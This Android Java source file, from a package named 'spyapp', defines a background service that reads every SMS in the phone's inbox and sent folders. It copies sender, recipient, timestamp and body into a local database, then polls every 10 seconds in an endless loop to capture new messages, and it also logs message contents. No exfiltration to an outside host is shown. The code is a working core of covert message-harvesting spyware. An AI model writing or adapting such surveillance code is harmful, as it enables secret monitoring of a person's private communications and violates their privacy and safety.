package com.example.spyapp;

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.support.v4.widget.SimpleCursorAdapter;
import android.util.Log;
import android.widget.ListView;
import android.widget.TextView;

public class MessageRetreiverService extends Service {
    static final String TAG="MessageRetreiverService:";
	private Handler handler1;
	public DatabaseHandler databasehandler1;
	SimpleCursorAdapter adapter;
	TextView lblMsg, lblNo;
    ListView lvMsg;
    int old_inbox_count;
	int old_sent_count;
    int new_inbox_count;
    int new_sent_count;
    long old_inbox_timestamp;
    long old_sent_timestamp;
    long new_inbox_timestamp;
    long new_sent_timestamp;
    
    
	@Override
	public void onCreate() {
		
		
		
		// TODO Auto-generated method stub
		super.onCreate();
		//Log.d(TAG, "onCreate");
		
//The code below runs for the first time the APP is started, populating the DB
		
		  new Thread() {
			public void run() {
				
				databasehandler1 = new DatabaseHandler(
					MessageRetreiverService.this);
				
				Uri mSmsinboxQueryUri = Uri.parse("content://sms/inbox");
				Cursor cursor1 = getContentResolver().query(
						mSmsinboxQueryUri,
						new String[] { "_id", "thread_id", "address", "person",
								"date", "body", "type" }, null, null, null);
				//	startManagingCursor(cursor1);
				String[] columns = new String[] { "address", "person", "date",
						"body", "type" };
				if (cursor1.getCount() > 0) {
					String count = Integer.toString(cursor1.getCount());
					//Log.d("Count", count);
					old_inbox_count=cursor1.getCount();
					cursor1.moveToFirst();
				//	cursor1.moveToNext();
					old_inbox_timestamp=cursor1.getLong(cursor1
							.getColumnIndex(columns[2]));
					Log.d(TAG,"OLD_INBOX_TIMESTAMP:"+Long.toString(old_inbox_timestamp));
					cursor1.moveToFirst();
					do {

						String address = cursor1.getString(cursor1
								.getColumnIndex(columns[0]));
				//		//Log.d(TAG, "Address:" + address);
						Long timestamp =cursor1.getLong((cursor1
								.getColumnIndex(columns[2])));
					Log.d(TAG, "Inside Timestamp:" + timestamp);
						String msg = cursor1.getString(cursor1
								.getColumnIndex(columns[3]));
					//	//Log.d(TAG, "MSG:" + msg);
						String type = cursor1.getString(cursor1
								.getColumnIndex(columns[4]));
						//      //Log.d(TAG,""+type);
						
						if(databasehandler1.checkTimestampUnique(timestamp)==true)
						{
							Log.d(TAG,"TIMESTAMP IS UNIQYE");
							databasehandler1.insertmsgintodb(timestamp,address,"SELF",msg,1);
						}
					}while (cursor1.moveToNext());
				}
				
				cursor1.close();
				
				Uri mSmsinboxQueryUri2 = Uri.parse("content://sms/sent");
				Cursor cursor2 = getContentResolver().query(
						mSmsinboxQueryUri2,
						new String[] { "_id", "thread_id", "address", "person",
								"date", "body", "type" }, null, null, null);
				//	startManagingCursor(cursor1);
				String[] columns2 = new String[] { "address", "person", "date",
						"body", "type" };
				if (cursor2.getCount() > 0) {
					String count2 = Integer.toString(cursor2.getCount());
					Log.e("Count", count2);
					old_sent_count=cursor2.getCount();
					cursor2.moveToFirst();
			//		cursor2.moveToNext();
					old_sent_timestamp=cursor2.getLong(cursor2
						.getColumnIndex(columns[2]));
			 //   cursor2.moveToFirst();
					do {

						String address2 = cursor2.getString(cursor2
								.getColumnIndex(columns[0]));
				//		//Log.d(TAG, "Address:" + address2);
						Long timestamp2 = cursor2.getLong((cursor2
								.getColumnIndex(columns[2])));
			//			//Log.d(TAG, "Timestamp:" + timestamp2.toString());
						String msg2 = cursor2.getString(cursor2
								.getColumnIndex(columns[3]));
					//	//Log.d(TAG, "MSG:" + msg);
						String type2 = cursor2.getString(cursor2
								.getColumnIndex(columns[4]));
						//      //Log.d(TAG,""+type);
						
						
						if(databasehandler1.checkTimestampUnique(timestamp2))
						{
							databasehandler1.insertmsgintodb(timestamp2,"SELF",address2,msg2,2);
						}
						
						
					}while (cursor2.moveToNext());
				}
				
				cursor2.close();
/*
 * Starting the process which will scan the inbox and outbox every 10 seconds,
 * find new messages and dump into the DB if they are new.
Logic is:
1) check count of inbox every 10 seconds
2) Is count of total messages in inbox = previous count?
3) If yes , then exit to step number 5
4) If no , start from the last entry in the inbox , check if it is greater than
the timestamp of the last message in the inbox DB
 4a) If yes, then add this to the DB and proceed to the previous message
4b) If no, don't do anything, proceed to STEP #5
5)  Do the above steps for the "Sent" messages.
*/			
			
			while(true)
//This is the continuous loop which will be happening in the background
			{  //Log.d(TAG,"Looping");
				try {
					Thread.sleep(10000);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
//point the cursors the latest message		
				
				
			
				Cursor cursor3 = getContentResolver().query(
						mSmsinboxQueryUri,
						new String[] { "_id", "thread_id", "address", "person",
								"date", "body", "type" }, null, null, null);
				
				Cursor cursor4 = getContentResolver().query(
						mSmsinboxQueryUri2,
						new String[] { "_id", "thread_id", "address", "person",
								"date", "body", "type" }, null, null, null);
				
			
				new_inbox_count=cursor3.getCount();
				Log.d(TAG,"NEW_INBOX_COUNT"+Long.toString(new_inbox_count));
				Log.d(TAG,"OLD_INBOX_COUNT"+Long.toString(old_inbox_count));
				new_sent_count=cursor4.getCount();
				cursor3.moveToFirst();
				cursor4.moveToFirst();
				new_inbox_timestamp=cursor3.getLong(cursor3
						.getColumnIndex(columns[2]));
				Log.d(TAG,"NEW_INBOX_TIMESTAMP"+Long.toString(new_inbox_timestamp));
				Log.d(TAG,"OLD_INBOX_TIMESTAMP"+Long.toString(old_inbox_timestamp));
				new_sent_timestamp=cursor4.getLong(cursor4
						.getColumnIndex(columns[2]));
				
//point the cursors the latest message				
				cursor3.moveToFirst();
				cursor4.moveToFirst();				
				
					while (new_inbox_timestamp>old_inbox_timestamp)
					{
						if (new_inbox_count>old_inbox_count)
						{
						
						Log.d(TAG,"New message has arrived in the inbox");
						
						old_inbox_count++;
						
						if (new_inbox_count==old_inbox_count)
						{
							old_inbox_timestamp=new_inbox_timestamp;
						}
						
						
						String address3 = cursor3.getString(cursor3
								.getColumnIndex(columns[0]));
						Log.d(TAG, "Address:" + address3);
						Long timestamp3 = cursor3.getLong((cursor3
								.getColumnIndex(columns[2])));
						Log.d(TAG, "Timestamp:" + timestamp3.toString());
						String msg3 = cursor3.getString(cursor3
								.getColumnIndex(columns[3]));
					Log.d(TAG, "MSG:" + msg3);
						String type4 = cursor4.getString(cursor4
								.getColumnIndex(columns[4]));
						//      //Log.d(TAG,""+type);
						
						
						if(databasehandler1.checkTimestampUnique(timestamp3))
						{
							databasehandler1.insertmsgintodb(timestamp3,address3,"SELF",msg3,1);
							Log.d(TAG,"Inserted into inbox DB");
							Log.d(TAG,"The messages in the inbox are:");
							databasehandler1.getAllvalues();
						}
						
						cursor3.moveToNext();
					}
				}
				if (new_sent_count>old_sent_count)
				{
					while (new_sent_timestamp>old_sent_timestamp)
					{
                     Log.d(TAG,"New message has been sent");
						
						
						if (new_sent_count==old_sent_count+1)
						{
							old_sent_timestamp=new_sent_timestamp;
						}
						
						old_sent_count++;
						
						String address4 = cursor4.getString(cursor4
								.getColumnIndex(columns[0]));
						Log.d(TAG, "Address:" + address4);
						Long timestamp4 = cursor4.getLong((cursor4
								.getColumnIndex(columns[2])));
						Log.d(TAG, "Timestamp:" + timestamp4.toString());
						String msg4 = cursor4.getString(cursor4
								.getColumnIndex(columns[3]));
			     		Log.d(TAG, "MSG:" + msg4);
				
				
						
						if(databasehandler1.checkTimestampUnique(timestamp4))
						{
							databasehandler1.insertmsgintodb(timestamp4,"SELF",address4,msg4,2);
							Log.d(TAG,"Inserted into inbox DB");

						}
						
						cursor4.moveToNext();
					}
				}
				cursor3.close();
				cursor4.close();
			}
			
				
				
				
			}
		}.start();            
}
   

	@Override
	public void onDestroy() {
		// TODO Auto-generated method stub
		super.onDestroy();
		//Log.d(TAG, "onDestroy");

	}

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

	
}
